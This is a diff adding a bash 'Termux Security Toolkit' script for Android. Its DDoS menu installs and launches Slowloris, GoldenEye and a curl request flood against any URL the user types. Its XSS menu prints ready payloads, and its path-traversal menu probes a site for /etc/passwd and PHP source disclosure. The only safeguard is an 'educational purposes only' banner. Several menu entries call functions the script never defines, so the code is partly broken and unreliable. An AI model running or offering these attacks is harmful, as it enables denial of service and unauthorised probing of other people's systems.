@@ -1,0 +1,330 @@
+#!/bin/bash
+
+# Termux Security Toolkit
+# Version: 3.0
+# Author: Ade Pratama
+# GitHub: https://github.com/HolyBytes
+# Copyright (c) 2023 - Licensed under MIT License
+
+# Global Variables
+TOOL_VERSION="3.0"
+CONFIG_DIR="$HOME/.config/termux-toolkit"
+LOG_FILE="$CONFIG_DIR/toolkit.log"
+API_KEYS_FILE="$CONFIG_DIR/api_keys.conf"
+TOOL_DIR="$HOME/Termux-Security-Toolkit"
+REPO_URL="https://github.com/HolyBytes/Termux-Security-Toolkit"
+
+# Colors
+RED='\033[1;31m'
+GREEN='\033[1;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[1;34m'
+MAGENTA='\033[1;35m'
+CYAN='\033[1;36m'
+WHITE='\033[1;37m'
+NC='\033[0m'
+
+# Initialize the toolkit
+init_toolkit() {
+    clear
+    # Create config directory if not exists
+    if [ ! -d "$CONFIG_DIR" ]; then
+        mkdir -p "$CONFIG_DIR"
+        touch "$LOG_FILE"
+        touch "$API_KEYS_FILE"
+    fi
+    
+    # Check requirements
+    check_requirements
+}
+
+# Check basic requirements
+check_requirements() {
+    if ! command -v curl &> /dev/null; then
+        echo -e "${YELLOW}[*] Installing curl...${NC}"
+        pkg install curl -y
+    fi
+    
+    if ! command -v git &> /dev/null; then
+        echo -e "${YELLOW}[*] Installing git...${NC}"
+        pkg install git -y
+    fi
+}
+
+# Display header with version info
+display_header() {
+    clear
+    echo -e "${CYAN}"
+    echo " ████████╗███████╗██████╗ ███╗   ███╗██╗   ██╗██╗  ██╗   Version: ${TOOL_VERSION}"
+    echo " ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║   ██║╚██╗██╔╝   "
+    echo "    ██║   █████╗  ██████╔╝██╔████╔██║██║   ██║ ╚███╔╝    Author: Ade Pratama"
+    echo "    ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║   ██║ ██╔██╗    GitHub: HolyBytes"
+    echo "    ██║   ███████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝██╔╝ ██╗   "
+    echo "    ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝   "
+    echo -e "${MAGENTA}"
+    echo " ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗"
+    echo " ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝"
+    echo " ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ "
+    echo " ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  "
+    echo " ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   "
+    echo " ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   "
+    echo -e "${NC}"
+    echo -e "${WHITE}================================================================================${NC}"
+    echo
+}
+
+# Display feature table with categories
+display_features() {
+    echo -e "${GREEN}"
+    printf "+--------------------------------------------------------------------------------+\n"
+    printf "| ${CYAN}%-4s${GREEN} | ${YELLOW}%-25s${GREEN} | ${MAGENTA}%-35s${GREEN} |\n" "No." "Tool Name" "Description"
+    printf "+--------------------------------------------------------------------------------+\n"
+    printf "| ${CYAN}%-4s${GREEN} | ${YELLOW}%-25s${GREEN} | ${MAGENTA}%-35s${GREEN} |\n" "1" "Have I Been Pwned" "Check account breaches"
+    printf "| ${CYAN}%-4s${GREEN} | ${YELLOW}%-25s${GREEN} | ${MAGENTA}%-35s${GREEN} |\n" "2" "SpiderFoot" "OSINT automation framework"
+    printf "| ${CYAN}%-4s${GREEN} | ${YELLOW}%-25s${GREEN} | ${MAGENTA}%-35s${GREEN} |\n" "3" "Shodan" "Internet device search"
+    printf "| ${CYAN}%-4s${GREEN} | ${YELLOW}%-25s${GREEN} | ${MAGENTA}%-35s${GREEN} |\n" "4" "HackTheBox" "HTB platform tools"
+    printf "| ${CYAN}%-4s${GREEN} | ${YELLOW}%-25s${GREEN} | ${MAGENTA}%-35s${GREEN} |\n" "5" "VirusTotal" "Malware scanning"
+    printf "| ${CYAN}%-4s${GREEN} | ${YELLOW}%-25s${GREEN} | ${MAGENTA}%-35s${GREEN} |\n" "6" "PayloadsAllTheThings" "Payload collection"
+    printf "| ${CYAN}%-4s${GREEN} | ${YELLOW}%-25s${GREEN} | ${MAGENTA}%-35s${GREEN} |\n" "7" "Wireshark (tshark)" "Network analysis"
+    printf "| ${CYAN}%-4s${GREEN} | ${YELLOW}%-25s${GREEN} | ${MAGENTA}%-35s${GREEN} |\n" "8" "DDoS Tools" "Stress testing tools"
+    printf "| ${CYAN}%-4s${GREEN} | ${YELLOW}%-25s${GREEN} | ${MAGENTA}%-35s${GREEN} |\n" "9" "XSS Tools" "Cross-site scripting"
+    printf "| ${CYAN}%-4s${GREEN} | ${YELLOW}%-25s${GREEN} | ${MAGENTA}%-35s${GREEN} |\n" "10" "Path Traversal" "Directory traversal"
+    printf "| ${CYAN}%-4s${GREEN} | ${YELLOW}%-25s${GREEN} | ${MAGENTA}%-35s${GREEN} |\n" "11" "Tool Information" "Usage guides"
+    printf "| ${CYAN}%-4s${GREEN} | ${YELLOW}%-25s${GREEN} | ${MAGENTA}%-35s${GREEN} |\n" "12" "Update Toolkit" "Check for updates"
+    printf "| ${CYAN}%-4s${GREEN} | ${YELLOW}%-25s${GREEN} | ${MAGENTA}%-35s${GREEN} |\n" "0" "Exit" "Quit the program"
+    printf "+--------------------------------------------------------------------------------+\n"
+    echo -e "${NC}"
+}
+
+# Open URL in browser
+open_browser() {
+    if command -v termux-open-url &> /dev/null; then
+        termux-open-url "$1"
+    else
+        echo -e "${YELLOW}[!] Cannot open browser automatically. Please visit: $1${NC}"
+    fi
+}
+
+# DDoS Tools Menu
+ddos_tools() {
+    display_header
+    echo -e "${CYAN}[ DDoS TESTING TOOLS ]${NC}"
+    echo -e "${RED}WARNING: These tools are for educational purposes only!${NC}"
+    echo
+    
+    echo -e "${YELLOW}Available Tools:${NC}"
+    echo "1. Slowloris"
+    echo "2. GoldenEye"
+    echo "3. HTTP Flood"
+    echo "4. Back to Main Menu"
+    echo
+    
+    read -p "$(echo -e ${BLUE}"Select tool [1-4]: "${NC})" choice
+    
+    case $choice in
+        1)
+            echo -e "${GREEN}[*] Installing Slowloris...${NC}"
+            pkg install python -y
+            pip install slowloris
+            echo -e "${GREEN}[+] Slowloris installed. Usage: slowloris <target>${NC}"
+            read -p "Enter target URL: " target
+            slowloris "$target" &
+            echo -e "${YELLOW}[*] Attack started in background${NC}"
+            ;;
+        2)
+            echo -e "${GREEN}[*] Installing GoldenEye...${NC}"
+            pkg install git python -y
+            git clone https://github.com/jseidl/GoldenEye
+            cd GoldenEye
+            echo -e "${GREEN}[+] GoldenEye installed. Usage: python goldeneye.py <target>${NC}"
+            read -p "Enter target URL: " target
+            python goldeneye.py "$target" &
+            echo -e "${YELLOW}[*] Attack started in background${NC}"
+            cd ..
+            ;;
+        3)
+            echo -e "${GREEN}[*] Simple HTTP Flood${NC}"
+            read -p "Enter target URL: " target
+            read -p "Number of requests: " count
+            echo -e "${YELLOW}[*] Sending $count requests to $target${NC}"
+            for i in $(seq 1 "$count"); do
+                curl -s "$target" > /dev/null &
+            done
+            echo -e "${GREEN}[+] Requests sent${NC}"
+            ;;
+        4)
+            return
+            ;;
+        *)
+            echo -e "${RED}[!] Invalid option${NC}"
+            ;;
+    esac
+    
+    read -p "$(echo -e ${BLUE}"Press [Enter] to continue"${NC})"
+}
+
+# XSS Tools Menu
+xss_tools() {
+    display_header
+    echo -e "${CYAN}[ XSS TESTING TOOLS ]${NC}"
+    
+    echo -e "${YELLOW}Available Tools:${NC}"
+    echo "1. XSS Hunter"
+    echo "2. XSS Payload Generator"
+    echo "3. XSS Scanner"
+    echo "4. Back to Main Menu"
+    echo
+    
+    read -p "$(echo -e ${BLUE}"Select tool [1-4]: "${NC})" choice
+    
+    case $choice in
+        1)
+            echo -e "${GREEN}[*] Opening XSS Hunter...${NC}"
+            open_browser "https://xsshunter.com/"
+            ;;
+        2)
+            echo -e "${GREEN}[*] XSS Payload Generator${NC}"
+            echo "<script>alert('XSS')</script>"
+            echo "<img src=x onerror=alert('XSS')>"
+            echo "\";alert('XSS');//"
+            echo -e "${YELLOW}Common payloads copied to clipboard${NC}"
+            termux-clipboard-set "<script>alert('XSS')</script>"
+            ;;
+        3)
+            echo -e "${GREEN}[*] Installing XSS Scanner...${NC}"
+            pkg install python -y
+            pip install xsscrapy
+            echo -e "${GREEN}[+] XSSCrapy installed. Usage: xsscrapy <url>${NC}"
+            read -p "Enter target URL: " target
+            xsscrapy "$target"
+            ;;
+        4)
+            return
+            ;;
+        *)
+            echo -e "${RED}[!] Invalid option${NC}"
+            ;;
+    esac
+    
+    read -p "$(echo -e ${BLUE}"Press [Enter] to continue"${NC})"
+}
+
+# Path Traversal Tools
+path_traversal() {
+    display_header
+    echo -e "${CYAN}[ PATH TRAVERSAL TOOLS ]${NC}"
+    
+    echo -e "${YELLOW}Available Tests:${NC}"
+    echo "1. Basic LFI Test"
+    echo "2. Directory Traversal"
+    echo "3. PHP Wrapper Tests"
+    echo "4. Back to Main Menu"
+    echo
+    
+    read -p "$(echo -e ${BLUE}"Select test [1-4]: "${NC})" choice
+    
+    case $choice in
+        1)
+            echo -e "${GREEN}[*] Basic LFI Test${NC}"
+            read -p "Enter target URL (e.g., http://site.com/page=): " target
+            echo -e "${YELLOW}[*] Testing basic LFI...${NC}"
+            curl -s "${target}../../../../etc/passwd" | grep -q "root:" && echo -e "${RED}[!] Vulnerable${NC}" || echo -e "${GREEN}[+] Not vulnerable${NC}"
+            ;;
+        2)
+            echo -e "${GREEN}[*] Directory Traversal${NC}"
+            read -p "Enter target URL: " target
+            echo -e "${YELLOW}[*] Testing directory traversal...${NC}"
+            curl -s "${target}%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep -q "root:" && echo -e "${RED}[!] Vulnerable${NC}" || echo -e "${GREEN}[+] Not vulnerable${NC}"
+            ;;
+        3)
+            echo -e "${GREEN}[*] PHP Wrapper Tests${NC}"
+            read -p "Enter target URL: " target
+            echo -e "${YELLOW}[*] Testing PHP filters...${NC}"
+            curl -s "${target}php://filter/convert.base64-encode/resource=index.php" | grep -q "PD9waHA" && echo -e "${RED}[!] Vulnerable${NC}" || echo -e "${GREEN}[+] Not vulnerable${NC}"
+            ;;
+        4)
+            return
+            ;;
+        *)
+            echo -e "${RED}[!] Invalid option${NC}"
+            ;;
+    esac
+    
+    read -p "$(echo -e ${BLUE}"Press [Enter] to continue"${NC})"
+}
+
+# Check and update toolkit
+update_toolkit() {
+    display_header
+    echo -e "${CYAN}[ UPDATE TOOLKIT ]${NC}"
+    
+    echo -e "${YELLOW}[*] Checking for updates...${NC}"
+    latest_version=$(curl -s "$REPO_URL/raw/main/termux-toolkit.sh" | grep "TOOL_VERSION=" | cut -d'"' -f2)
+    
+    if [ "$latest_version" != "$TOOL_VERSION" ]; then
+        echo -e "${GREEN}[+] New version available: $latest_version${NC}"
+        echo -e "${YELLOW}Current version: $TOOL_VERSION${NC}"
+        read -p "Update now? [y/N]: " confirm
+        
+        if [[ "$confirm" =~ ^[Yy]$ ]]; then
+            echo -e "${GREEN}[*] Updating toolkit...${NC}"
+            cd "$TOOL_DIR" || exit
+            git pull origin main
+            echo -e "${GREEN}[+] Update complete! Please restart the toolkit.${NC}"
+            exit 0
+        fi
+    else
+        echo -e "${GREEN}[+] You have the latest version ($TOOL_VERSION)${NC}"
+    fi
+    
+    read -p "$(echo -e ${BLUE}"Press [Enter] to continue"${NC})"
+}
+
+# Show version information
+show_version() {
+    display_header
+    echo -e "${CYAN}[ VERSION INFORMATION ]${NC}"
+    echo -e "${YELLOW}Toolkit Version:${NC} $TOOL_VERSION"
+    echo -e "${YELLOW}Last Updated:${NC} 2023-11-20"
+    echo -e "${YELLOW}Author:${NC} Ade Pratama"
+    echo -e "${YELLOW}GitHub:${NC} https://github.com/HolyBytes"
+    echo -e "${YELLOW}License:${NC} MIT"
+    echo
+    echo -e "${CYAN}[ SYSTEM INFORMATION ]${NC}"
+    echo -e "${YELLOW}Termux Version:${NC} $(termux-info | grep -i 'termux-packages')"
+    echo -e "${YELLOW}Device Architecture:${NC} $(uname -m)"
+    echo -e "${YELLOW}Android Version:${NC} $(getprop ro.build.version.release)"
+    
+    read -p "$(echo -e ${BLUE}"Press [Enter] to continue"${NC})"
+}
+
+# Main menu
+main_menu() {
+    while true; do
+        display_header
+        display_features
+        echo
+        read -p "$(echo -e ${BLUE}"Select an option [0-12]: "${NC})" option
+        
+        case $option in
+            1) have_i_been_pwned ;;
+            2) spiderfoot ;;
+            3) shodan_search ;;
+            4) hackthebox ;;
+            5) virustotal ;;
+            6) payloads_all_the_things ;;
+            7) wireshark_tshark ;;
+            8) ddos_tools ;;
+            9) xss_tools ;;
+            10) path_traversal ;;
+            11) tool_information ;;
+            12) update_toolkit ;;
+            0) exit_toolkit ;;
+            *) echo -e "${RED}[!] Invalid option!${NC}"; sleep 1 ;;
+        esac
+    done
+}
+
+# Start the toolkit
+init_toolkit
+main_menu
